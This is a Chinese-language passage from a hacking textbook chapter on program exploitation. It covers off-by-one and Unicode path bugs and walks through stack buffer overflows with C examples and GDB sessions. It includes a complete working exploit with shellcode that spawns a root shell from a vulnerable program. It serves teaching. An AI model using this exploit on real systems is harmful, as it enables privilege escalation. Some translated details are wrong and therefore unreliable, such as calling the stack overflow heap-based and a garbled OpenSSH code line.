# 第 0x300 章。利用

程序利用是黑客攻击的基石。正如前一章所展示的，一个程序由一系列复杂的规则组成，遵循一定的执行流程，最终告诉计算机做什么。利用程序就是以巧妙的方式让计算机做你想让它做的事，即使当前运行的程序被设计成防止这种操作。由于程序实际上只能做它被设计去做的事，因此安全漏洞实际上是程序或程序运行环境的缺陷或疏忽。需要具有创造性的思维来发现这些漏洞并编写补偿这些漏洞的程序。有时这些漏洞是相对明显的程序员错误的结果，但也有一些不太明显的错误产生了更复杂的利用技术，这些技术可以应用于许多不同的地方。

程序只能按照其编程去做，字面意思。不幸的是，写下的内容并不总是与程序员希望程序去做的事情相一致。这个原则可以用一个笑话来解释：

> 一个男人正在穿过森林，他发现地上有一个魔法灯。出于本能，他拿起灯，用袖子擦了擦它的侧面，一个精灵突然出现。精灵感谢那个人释放了他，并承诺给他三个愿望。那个人欣喜若狂，确切地知道他想要什么。
> 
> “首先，”那个人说，“我想得到十亿美元。”
> 
> 灵魂摆动手指，一个装满钱的公文包从空中出现。
> 
> 那个人惊讶地睁大了眼睛，继续说：“接下来，我要一辆法拉利。”
> 
> 灵魂摆动手指，一辆法拉利从烟雾中冒了出来。
> 
> 那个人继续说：“最后，我想对女人有不可抗拒的吸引力。”
> 
> 灵魂摆动手指，那个人变成了一个巧克力盒子。

正如一个人的最终愿望是基于他说的话而不是他的想法而得到满足一样，一个程序会严格按照其指令执行，结果并不总是程序员所期望的。有时，后果可能是灾难性的。

程序员也是人，有时他们写的代码并不完全符合他们的意图。例如，一种常见的编程错误被称为*差一错误*。正如其名所示，这是一种程序员多计算了一个的错误。这种情况比你想的更常见，而且最好用一个问题来解释：如果你正在建造一个 100 英尺的栅栏，栅栏柱之间的距离是 10 英尺，你需要多少个栅栏柱？显然的答案是 10 个栅栏柱，但这是不正确的，因为你实际上需要 11 个。这种类型的“差一”错误通常被称为*栅栏错误*，它发生在程序员错误地计算项目数量而不是项目之间的空间，或者反之亦然。另一个例子是当程序员试图选择一个用于处理的数字或项目范围时，例如处理项目*`N`*到*`M`*。如果`N = 5`和`M = 17`，需要处理多少个项目？显然的答案是`M - N`，即`17 - 5 = 12`个项目。但这是不正确的，因为实际上有`M - N + 1`个项目，总共是`13`个项目。这种看似反直觉的情况正是这些错误发生的原因。

通常，栅栏错误会被忽视，因为程序并没有针对每一种可能性进行测试，而且栅栏错误的效果通常在正常程序执行期间不会出现。然而，当程序接收到使错误效果显现的输入时，错误的后果可能会对程序逻辑的其他部分产生连锁反应。当被适当利用时，一个“差一”错误可以使看似安全的程序变成安全漏洞。

一个经典的例子是 OpenSSH，它本应是一个安全的终端通信程序套件，旨在取代不安全且未加密的服务，如 telnet、rsh 和 rcp。然而，在通道分配代码中存在一个“差一”错误，并被大量利用。具体来说，代码中包含了一个 if 语句，其内容如下：

```
if (id <: 0 || id > channels_alloc) {
```

它应该是

```
if (id < 0 || id >= channels_alloc) {
```

用通俗易懂的话来说，这段代码的读法是*如果 ID 小于 0 或者 ID 大于分配的通道数，执行以下操作*，而它本应该是*如果 ID 小于 0 或者 ID 大于或等于分配的通道数，执行以下操作*。

这个简单的“差一”错误允许进一步利用程序，以至于一个正常用户在验证和登录后能够获得对系统的完全管理权限。这种功能显然不是程序员为像 OpenSSH 这样的安全程序所期望的，但计算机只能做它被告诉的事情。

另一种似乎会滋生可利用的程序员错误的情况是，当程序被快速修改以扩展其功能时。虽然这种功能增加使得程序更具市场吸引力并提高了其价值，但它也增加了程序的复杂性，从而增加了疏忽的可能性。微软的 IIS 网络服务器程序旨在向用户提供服务静态和交互式网络内容。为了实现这一点，程序必须允许用户在特定目录内读取、写入和执行程序和文件；然而，这种功能必须限制在这些特定目录内。如果没有这种限制，用户将完全控制系统，这显然从安全角度来看是不理想的。为了防止这种情况，程序设计了路径检查代码，旨在防止用户使用反斜杠字符在目录树中向后遍历并进入其他目录。

尽管增加了对 Unicode 字符集的支持，但程序的复杂性仍然持续增加。*Unicode*是一种双字节字符集，旨在为包括中文和阿拉伯语在内的每一种语言提供字符。通过为每个字符使用两个字节而不是一个字节，Unicode 允许有数万个可能的字符，相比之下，单字节字符只能允许几百个字符。这种额外的复杂性意味着现在存在多个反斜杠字符的表示形式。例如，在 Unicode 中`%5c`翻译为反斜杠字符，但这种翻译是在路径检查代码运行之后完成的。因此，使用`%5c`而不是\，确实可以遍历目录，从而允许上述安全风险。Sadmind 蠕虫和 CodeRed 蠕虫就是利用这种 Unicode 转换疏忽来篡改网页的。

这个法律条文原则在计算机编程领域之外的另一个相关例子是拉马奇亚漏洞。就像计算机程序的规则一样，美国的法律体系有时会有一些规则并没有明确说明其创造者的意图，就像计算机程序漏洞一样，这些法律漏洞可以被用来规避法律的意图。1993 年底，一个名叫大卫·拉马奇亚的 21 岁计算机黑客和麻省理工学院的学生建立了一个名为 Cynosure 的公告板系统，用于软件盗版。那些有软件要分享的人会上传，而那些想要软件的人会下载。这个服务只在线大约六周，但产生了全球范围内的巨大网络流量，最终引起了大学和联邦当局的注意。软件公司声称由于 Cynosure，他们损失了一百万美元，联邦大陪审团指控拉马奇亚犯有一项与未知人员合谋违反电信诈骗法的罪行。然而，指控被撤销，因为拉马奇亚被指控的行为并不构成《版权法》下的犯罪行为，因为侵权不是为了商业利益或私人财务收益。显然，立法者从未预料到有人可能会出于除个人财务收益以外的动机从事这些活动。（国会于 1997 年通过《无电子盗窃法》关闭了这个漏洞。）尽管这个例子并不涉及利用计算机程序，但法官和法院可以被视为执行法律体系程序的计算机。黑客的抽象概念超越了计算，可以应用于涉及复杂系统的许多其他生活方面。

# 通用利用技术

离差一的错误和不正确的 Unicode 扩展都是当时可能难以察觉但事后任何程序员都会明显察觉到的错误。然而，有一些常见的错误可以通过不明显的方式被利用。这些错误对安全性的影响并不总是显而易见，这些安全问题在代码的各个地方都有发现。由于相同的错误在许多不同的地方都会发生，因此已经发展出通用的利用技术来利用这些错误，并且它们可以在各种情况下使用。

大多数程序漏洞都与内存损坏有关。这包括常见的漏洞利用技术，如缓冲区溢出，以及不太常见的格式化字符串漏洞等。使用这些技术，最终目标是通过对目标程序执行流程进行欺骗，使其运行已偷偷运入内存的恶意代码，从而控制目标程序的执行流程。这种进程劫持过程被称为*任意代码执行*，因为黑客可以迫使程序执行几乎任何他们想要的事情。像 LaMacchia 漏洞一样，这类漏洞存在是因为程序无法处理特定的意外情况。在正常情况下，这些意外情况会导致程序崩溃——比喻地说，将执行流程推下悬崖。但如果环境被仔细控制，执行流程可以被控制——防止崩溃并重新编程进程。

# 缓冲区溢出

缓冲区溢出漏洞自计算机的早期就已经存在，并且至今仍然存在。大多数网络蠕虫都使用缓冲区溢出漏洞进行传播，甚至最近在 Internet Explorer 中发现的零日 VML 漏洞也是由于缓冲区溢出。

C 是一种高级编程语言，但它假定程序员负责数据完整性。如果这种责任转移到编译器，生成的二进制文件会显著变慢，因为每个变量都需要进行完整性检查。此外，这也会从程序员手中移走相当一部分控制权，并使语言变得复杂。

虽然 C 语言的简洁性增加了程序员的控制力以及生成程序的效率，但它也可能导致程序员不小心编写出易受缓冲区溢出和内存泄漏影响的程序。这意味着一旦变量分配了内存，就没有内置的安全措施来确保变量的内容适合分配的内存空间。如果一个程序员想要将十个字节的数据放入只分配了八个字节空间的缓冲区中，这种操作是被允许的，尽管它很可能会使程序崩溃。这种情况被称为*缓冲区溢出*或*缓冲区越界*，因为额外的两个字节数据会溢出并从分配的内存中溢出，覆盖任何随后发生的内容。如果关键数据被覆盖，程序将崩溃。overflow_example.c 代码提供了一个示例。

## 缓冲区溢出

### overflow_example.c

```
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
   int value = 5;
   char buffer_one[8], buffer_two[8];

   strcpy(buffer_one, "one"); /* Put "one" into buffer_one. */
   strcpy(buffer_two, "two"); /* Put "two" into buffer_two. */

   printf("[BEFORE] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
   printf("[BEFORE] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
   printf("[BEFORE] value is at %p and is %d (0x%08x)\n", &value, value, value);

   printf("\n[STRCPY] copying %d bytes into buffer_two\n\n",  strlen(argv[1]));
   strcpy(buffer_two, argv[1]); /* Copy first argument into buffer_two. */

   printf("[AFTER] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
   printf("[AFTER] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
   printf("[AFTER] value is at %p and is %d (0x%08x)\n", &value, value, value); 
}
```

到现在为止，你应该能够阅读上面的源代码并弄清楚程序的功能。在下面的示例输出中进行编译后，我们尝试将十个字节从第一个命令行参数复制到只有八个字节分配的`buffer_two`中。

```
reader@hacking:~/booksrc $ gcc -o overflow_example overflow_example.c 
reader@hacking:~/booksrc $ ./overflow_example 1234567890
[BEFORE] buffer_two is at 0xbffff7f0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7f8 and contains 'one'
[BEFORE] value is at 0xbffff804 and is 5 (0x00000005)

[STRCPY] copying 10 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7f0 and contains '1234567890'
[AFTER] buffer_one is at 0xbffff7f8 and contains '90'
[AFTER] value is at 0xbffff804 and is 5 (0x00000005)
reader@hacking:~/booksrc $
```

注意，`buffer_one`在内存中直接位于`buffer_two`之后，因此当将十个字节复制到`buffer_two`时，最后的两个字节`90`会溢出到`buffer_one`并覆盖掉原来的内容。

较大的缓冲区自然会溢出到其他变量中，但如果使用足够大的缓冲区，程序将崩溃并死亡。

```
reader@hacking:~/booksrc $ ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 29 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7e0 and contains
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
Segmentation fault (core dumped)
reader@hacking:~/booksrc $
```

这类程序崩溃相当常见——想想看有多少次程序在你面前崩溃或蓝屏。程序员的错误是遗漏——应该有长度检查或对用户提供的输入进行限制。这类错误很容易犯，并且很难发现。实际上，notesearch.c 程序中就包含一个缓冲区溢出漏洞。即使你已经熟悉 C 语言，你可能直到现在才注意到这一点。

```
reader@hacking:~/booksrc $ ./notesearch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-------[ end of note data ]-------
Segmentation fault
reader@hacking:~/booksrc $
```

程序崩溃很烦人，但在黑客手中，它们可能变得非常危险。一个知识渊博的黑客可以在程序崩溃时控制程序，并产生一些令人惊讶的结果。exploit_notesearch.c 代码展示了这种危险。

### exploit_notesearch.c

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
   unsigned int i, *ptr, ret, offset=270;
   char *command, *buffer;

   command = (char *) malloc(200);
   bzero(command, 200); // Zero out the new memory.

   strcpy(command, "./notesearch \'"); // Start command buffer.
   buffer = command + strlen(command); // Set buffer at the end.

   if(argc > 1) // Set offset.
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset; // Set return address.

   for(i=0; i < 160; i+=4) // Fill buffer with return address.
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer, 0x90, 60); // Build NOP sled.
   memcpy(buffer+60, shellcode, sizeof(shellcode)-1);

   strcat(command, "\'");

   system(command); // Run exploit.
   free(command);
}
```

这个漏洞的源代码将在稍后进行深入解释，但总的来说，它只是生成一个命令字符串，该字符串将在单引号之间执行 notesearch 程序，并带有命令行参数。它使用字符串函数来完成这个任务：`strlen()`获取当前字符串的长度（以定位缓冲区指针）和`strcat()`将结尾的单引号连接到末尾。最后，使用系统函数执行命令字符串。单引号之间的缓冲区是漏洞的真正核心。其余的只是将这种数据毒药传递出去的方法。看看一个可控的崩溃能做什么。

```
reader@hacking:~/booksrc $ gcc exploit_notesearch.c
reader@hacking:~/booksrc $ ./a.out
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]-------
sh-3.2#
```

该漏洞能够利用溢出提供一个 root shell——提供对计算机的完全控制。这是一个基于堆的缓冲区溢出漏洞的例子。

## 基于堆的缓冲区溢出漏洞

notesearch 漏洞通过破坏内存来控制执行流程。auth_overflow.c 程序展示了这一概念。

### auth_overflow.c

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
   int auth_flag = 0;
   char password_buffer[16];

   strcpy(password_buffer, password);

   if(strcmp(password_buffer, "brillig") == 0)
      auth_flag = 1;
   if(strcmp(password_buffer, "outgrabe") == 0)
      auth_flag = 1;

   return auth_flag;
}

int main(int argc, char *argv[]) {
   if(argc < 2) {
      printf("Usage: %s <password>\n", argv[0]);
      exit(0);
   }
   if(check_authentication(argv[1])) {
      printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
      printf("      Access Granted.\n");
      printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
   } else {
      printf("\nAccess Denied.\n");
   }
}
```

这个示例程序接受一个密码作为其唯一的命令行参数，然后调用一个`check_authentication()`函数。这个函数允许两个密码，旨在代表多种认证方法。如果使用这两个密码中的任何一个，函数返回 1，从而允许访问。你应该能够在编译之前通过查看源代码来理解大部分内容。不过，在编译时请使用`-g`选项，因为我们稍后将对这个程序进行调试。

```
reader@hacking:~/booksrc $ gcc -g -o auth_overflow auth_overflow.c
reader@hacking:~/booksrc $ ./auth_overflow
Usage: ./auth_overflow <password>
reader@hacking:~/booksrc $ ./auth_overflow test

Access Denied.
reader@hacking:~/booksrc $ ./auth_overflow brillig

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
reader@hacking:~/booksrc $ ./auth_overflow outgrabe

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
reader@hacking:~/booksrc $
```

到目前为止，一切如源代码所述正常工作。对于像计算机程序这样确定性的东西来说，这是可以预料的。但是溢出可能导致意外甚至矛盾的行为，允许在没有正确密码的情况下访问。

```
reader@hacking:~/booksrc $ ./auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
reader@hacking:~/booksrc $
```

你可能已经猜到了发生了什么，但让我们用调试器来看一下它的具体细节。

```
reader@hacking:~/booksrc $ gdb -q ./auth_overflow
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) list 1
1       #include <stdio.h>
2       #include <stdlib.h>
3       #include <string.h>
4
5       int check_authentication(char *password) {
6               int auth_flag = 0;
7               char password_buffer[16];
8
`9`                strcpy(password_buffer, password);
10
(gdb)
11              if(strcmp(password_buffer, "brillig") == 0)
12                      auth_flag = 1;
13              if(strcmp(password_buffer, "outgrabe") == 0)
14                      auth_flag = 1;
15
`16`              return auth_flag;
17      }
18
19      int main(int argc, char *argv[]) {
20              if(argc < 2) {
(gdb) break 9
Breakpoint 1 at 0x8048421: file auth_overflow.c, line 9.
(gdb) break 16
Breakpoint 2 at 0x804846f: file auth_overflow.c, line 16.
(gdb)
```

使用`-q`选项启动 GDB 调试器以抑制欢迎横幅，并在第 9 行和第 16 行设置断点。当程序运行时，执行将在这些断点处暂停，给我们一个检查内存的机会。

```
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/reader/booksrc/auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, check_authentication (password=0xbffff9af 'A' <repeats 30 times>) at
auth_overflow.c:9
9               strcpy(password_buffer, password);
(gdb) x/s password_buffer
0xbffff7a0:      ")????o??????)\205\004\b?o??p???????"
(gdb) x/x &auth_flag
0xbffff7bc:     0x00000000
(gdb) print 0xbffff7bc - 0xbffff7a0
$1 = 28
(gdb) x/16xw password_buffer
0xbffff7a0:     0xb7f9f729      0xb7fd6ff4      0xbffff7d8      0x08048529
0xbffff7b0:     0xb7fd6ff4      0xbffff870      0xbffff7d8      0x00000000
0xbffff7c0:     0xb7ff47b0      0x08048510      0xbffff7d8      0x080484bb
0xbffff7d0:     0xbffff9af      0x08048510      0xbffff838      0xb7eafebc
(gdb)
```

第一个断点出现在`strcpy()`函数执行之前。通过检查`password_buffer`指针，调试器显示它被填充了随机的未初始化数据，并且位于内存中的`0xbffff7a0`地址。通过检查`auth_flag`变量的地址，我们可以看到它在`0xbffff7bc`的位置，其值为 0。使用打印命令可以进行算术运算，并显示`auth_flag`位于`password_buffer`起始点之后 28 个字节。这种关系也可以在以`password_buffer`开始的内存块中看到。`auth_flag`的位置用粗体表示。

```
(gdb) continue
Continuing.

Breakpoint 2, check_authentication (password=0xbffff9af 'A' <repeats 30 times>) at
auth_overflow.c:16
16              return auth_flag;
(gdb) x/s password_buffer
0xbffff7a0:      'A' <repeats 30 times>
(gdb) x/x &auth_flag
0xbffff7bc:     0x00004141
(gdb) x/16xw password_buffer
0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x00004141
0xbffff7c0:     0xb7ff47b0      0x08048510      0xbffff7d8      0x080484bb
0xbffff7d0:     0xbffff9af      0x08048510      0xbffff838      0xb7eafebc
(gdb) x/4cb &auth_flag
0xbffff7bc:     65 'A'  65 'A'  0 '\0'  0 '\0'
(gdb) x/dw &auth_flag
0xbffff7bc:     16705
(gdb)
```

继续到`strcpy()`之后找到的下一个断点，再次检查这些内存位置。`password_buffer`溢出到`auth_flag`，将其前两个字节改为`0x41`。`0x00004141`的值可能看起来又向后了，但请记住，*x*86 是小端架构，所以它应该是这样的。如果你单独检查这四个字节中的每一个，你可以看到内存的实际布局。最终，程序将把这个值当作一个整数，其值为 16705。

```
(gdb) continue
Continuing.

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-

Program exited with code 034.
(gdb)
```

在溢出之后，`check_authentication()`函数将返回 16705 而不是 0。由于 if 语句将任何非零值视为已认证，程序的执行流程将控制到认证部分。在这个例子中，`auth_flag`变量是执行控制点，因为覆盖这个值是控制来源。

但这是一个非常人为的例子，它依赖于变量的内存布局。在`auth_overflow2.c`中，变量是按相反顺序声明的。（对`auth_overflow.c`的更改用粗体表示。）

### `auth_overflow2.c`

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
   `char password_buffer[16];    int auth_flag = 0;`

   strcpy(password_buffer, password);

   if(strcmp(password_buffer, "brillig") == 0)
      auth_flag = 1;
   if(strcmp(password_buffer, "outgrabe") == 0)
      auth_flag = 1;

   return auth_flag;
}

int main(int argc, char *argv[]) {
   if(argc < 2) {
      printf("Usage: %s <password>\n", argv[0]);
      exit(0);
   }
   if(check_authentication(argv[1])) {
      printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
      printf("      Access Granted.\n");
      printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
   } else {
      printf("\nAccess Denied.\n");
   }
}
```

这个简单的更改将`auth_flag`变量放在内存中的`password_buffer`之前。这消除了使用`return_value`变量作为执行控制点的需要，因为它不能再被溢出所破坏。

```
reader@hacking:~/booksrc $ gcc -g auth_overflow2.c
reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) list 1
1       #include <stdio.h>
2       #include <stdlib.h>
3       #include <string.h>
4
5       int check_authentication(char *password) {
6               char password_buffer[16];
7               int auth_flag = 0;
8
9               strcpy(password_buffer, password);
10
(gdb)
11              if(strcmp(password_buffer, "brillig") == 0)
12                      auth_flag = 1;
13              if(strcmp(password_buffer, "outgrabe") == 0)
14                      auth_flag = 1;
15
16              return auth_flag;
17      }
18
19      int main(int argc, char *argv[]) {
20              if(argc < 2) {
(gdb) break 9
Breakpoint 1 at 0x8048421: file auth_overflow2.c, line 9.
(gdb) break 16
Breakpoint 2 at 0x804846f: file auth_overflow2.c, line 16.
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>) at
auth_overflow2.c:9
9               strcpy(password_buffer, password);
(gdb) x/s password_buffer
0xbffff7c0:      "?o??\200????????o???G??\020\205\004\b?????\204\004\b????\020\205\004\
bH???????\002"
(gdb) x/x &auth_flag
0xbffff7bc:     0x00000000
(gdb) x/16xw &auth_flag
0xbffff7bc:     `0x00000000`      0xb7fd6ff4      0xbffff880      0xbffff7e8
0xbffff7cc:     0xb7fd6ff4      0xb7ff47b0      0x08048510      0xbffff7e8
0xbffff7dc:     0x080484bb      0xbffff9b7      0x08048510      0xbffff848
0xbffff7ec:     0xb7eafebc      0x00000002      0xbffff874      0xbffff880 
(gdb)
```

设置类似的断点，并检查内存，显示`auth_flag`（上面和下面都用粗体表示）在内存中位于`password_buffer`之前。这意味着`auth_flag`永远不会被`password_buffer`中的溢出覆盖。

```
(gdb) cont
Continuing.

Breakpoint 2, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>)
    at auth_overflow2.c:16
16              return auth_flag;
(gdb) x/s password_buffer
0xbffff7c0:      'A' <repeats 30 times>
(gdb) x/x &auth_flag
0xbffff7bc:     0x00000000
(gdb) x/16xw &auth_flag
0xbffff7bc:     `0x00000000`      0x41414141      0x41414141      0x41414141
0xbffff7cc:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff7dc:     0x08004141      0xbffff9b7      0x08048510      0xbffff848
0xbffff7ec:     0xb7eafebc      0x00000002      0xbffff874      0xbffff880 
(gdb)
```

如预期的那样，溢出不会干扰`auth_flag`变量，因为它位于缓冲区之前。但确实存在另一个执行控制点，尽管你无法在 C 代码中看到它。它方便地位于所有栈变量之后，因此可以很容易地被覆盖。这种内存对于所有程序的操作都是至关重要的，因此它存在于所有程序中，当它被覆盖时，通常会导致程序崩溃。

```
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
(gdb)
```

从上一章回顾，堆栈是程序使用的五个内存段之一。堆栈是一种 FILO（先进后出）数据结构，用于在函数调用期间维护局部变量的执行流程和上下文。当一个函数被调用时，一个称为**栈帧**的结构会被推入堆栈，并且 EIP 寄存器跳转到函数的第一个指令。每个栈帧包含该函数的局部变量以及一个返回地址，以便 EIP 能够恢复。当函数执行完毕后，栈帧从堆栈中弹出，并使用返回地址来恢复 EIP。所有这些功能都是架构内建的，通常由编译器处理，而不是程序员。

当调用`check_authentication()`函数时，一个新的栈帧会被推入`main()`函数栈帧之上。在这个栈帧中包含局部变量、返回地址以及函数的参数。

我们可以在调试器中看到所有这些元素。

![](img/httpatomoreillycomsourcenostarchimages254428.png.jpg)

图 0x300-1.

```
reader@hacking:~/booksrc $ gcc -g auth_overflow2.c
reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) list 1
1       #include <stdio.h>
2       #include <stdlib.h>
3       #include <string.h>
4
5       int check_authentication(char *password) {
6               char password_buffer[16];
7               int auth_flag = 0;
8
9               strcpy(password_buffer, password);
10
(gdb)
11              if(strcmp(password_buffer, "brillig") == 0)
12                      auth_flag = 1;
13              if(strcmp(password_buffer, "outgrabe") == 0)
14                      auth_flag = 1;
15
16              return auth_flag;
17      }
18
19      int main(int argc, char *argv[]) {
20              if(argc < 2) {
(gdb)
21                      printf("Usage: %s <password>\n", argv[0]);
22                      exit(0);
23              }
24              if(check_authentication(argv[1])) {
25                      printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
26                      printf("      Access Granted.\n");
27                      printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
28              } else {
29                      printf("\nAccess Denied.\n");
30         }
(gdb) break 24
Breakpoint 1 at 0x80484ab: file auth_overflow2.c, line 24.
(gdb) break 9
Breakpoint 2 at 0x8048421: file auth_overflow2.c, line 9.
(gdb) break 16
Breakpoint 3 at 0x804846f: file auth_overflow2.c, line 16.
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, main (argc=2, argv=0xbffff874) at auth_overflow2.c:24
24              if(check_authentication(argv[1])) {
(gdb) i r esp
esp            0xbffff7e0       0xbffff7e0
(gdb) x/32xw $esp
0xbffff7e0:     0xb8000ce0      0x08048510      0xbffff848      0xb7eafebc
0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898
0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848
0xbffff820:     0x40f5f7f0      0x48e0fe81      0x00000000      0x00000000
0xbffff830:     0x00000000      0xb7ff9300      0xb7eafded      0xb8000ff4
0xbffff840:     0x00000002      0x08048350      0x00000000      0x08048371
0xbffff850:     0x08048474      0x00000002      0xbffff874      0x08048510 
(gdb)
```

第一个断点位于`main()`中调用`check_authentication()`之前。在这个点上，栈指针寄存器（ESP）是`0xbffff7e0`，堆栈的顶部如下所示。这都属于`main()`的栈帧。继续到`check_authentication()`内部的下一个断点，下面的输出显示 ESP 随着向上移动内存列表而减小，为`check_authentication()`的栈帧腾出空间（以粗体显示），现在它已经在堆栈上。在找到`auth_flag`变量（![](img/httpatomoreillycomsourcenostarchimages254488.png)）和变量`password_buffer`（![](img/httpatomoreillycomsourcenostarchimages254530.png)）的地址后，它们在栈帧中的位置就可以看到了。

```
(gdb) c
Continuing.

Breakpoint 2, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>) at
auth_overflow2.c:9
9               strcpy(password_buffer, password);
(gdb) i r esp
esp            0xbffff7a0       0xbffff7a0
(gdb) x/32xw $esp
0xbffff7a0:     0x00000000      `0x08049744      0xbffff7b8      0x080482d9`
0xbffff7b0:     `0xb7f9f729      0xb7fd6ff4      0xbffff7e8`    0x00000000
0xbffff7c0:     `0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4`
0xbffff7d0:     `0xb7ff47b0      0x08048510      0xbffff7e8      0x080484bb`
0xbffff7e0:     `0xbffff9b7`      0x08048510      0xbffff848      0xb7eafebc
0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898
0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000
0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848
(gdb) p 0xbffff7e0 - 0xbffff7a0
$1 = 64
(gdb) x/s password_buffer
0xbffff7c0:      "?o??\200????????o???G??\020\205\004\b?????\204\004\b????\020\205\004\
bH???????\002"
(gdb) x/x &auth_flag
0xbffff7bc:     0x00000000
(gdb)
```

继续到`check_authentication()`中的第二个断点，当函数被调用时，一个栈帧（以粗体显示）被推入堆栈。由于堆栈向上增长到较低的内存地址，栈指针现在在`0xbffff7a0`处减少了 64 字节。栈帧的大小和结构可以因函数和某些编译器优化而大不相同。例如，这个栈帧的前 24 字节只是编译器放置的填充。局部栈变量`auth_flag`和`password_buffer`在栈帧中的相应内存位置显示。`auth_flag`（![](img/httpatomoreillycomsourcenostarchimages254488.png)）显示在`0xbffff7bc`，密码缓冲区的 16 字节（![](img/httpatomoreillycomsourcenostarchimages254530.png)）显示在`0xbffff7c0`。

栈帧包含的不仅仅是局部变量和填充。下面显示了`check_authentication()`栈帧的元素。

首先，用斜体显示为局部变量保存的内存。这从`auth_flag`变量`0xbffff7bc`开始，一直延续到 16 字节的`password_buffer`变量的末尾。栈上的下几个值只是编译器添加的填充，以及称为*保存的帧指针*的东西。如果程序使用优化标志`-fomit-frame-pointer`编译，则不会在栈帧中使用帧指针。在![httpatomoreillycomsourcenostarchimages254537.png](img/httpatomoreillycomsourcenostarchimages254537.png)处，值`0x080484bb`是栈帧的返回地址，在![httpatomoreillycomsourcenostarchimages254461.png](img/httpatomoreillycomsourcenostarchimages254461.png)处，地址`0xbffffe9b7`是指向包含 30 个*A*的字符串的指针。这必须是`check_authentication()`函数的参数。

```
(gdb) x/32xw $esp
0xbffff7a0:     0x00000000      `0x08049744      0xbffff7b8      0x080482d9`
0xbffff7b0:     `0xb7f9f729      0xb7fd6ff4      0xbffff7e8`      *`0x00000000`*
0xbffff7c0:     *`0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4`*
0xbffff7d0:     `0xb7ff47b0      0x08048510      0xbffff7e8     ![](img/httpatomoreillycomsourcenostarchimages254537.png)0x080484bb`
0xbffff7e0:     0xbffff9b7      0x08048510      0xbffff848      0xb7eafebc
0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898
0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000
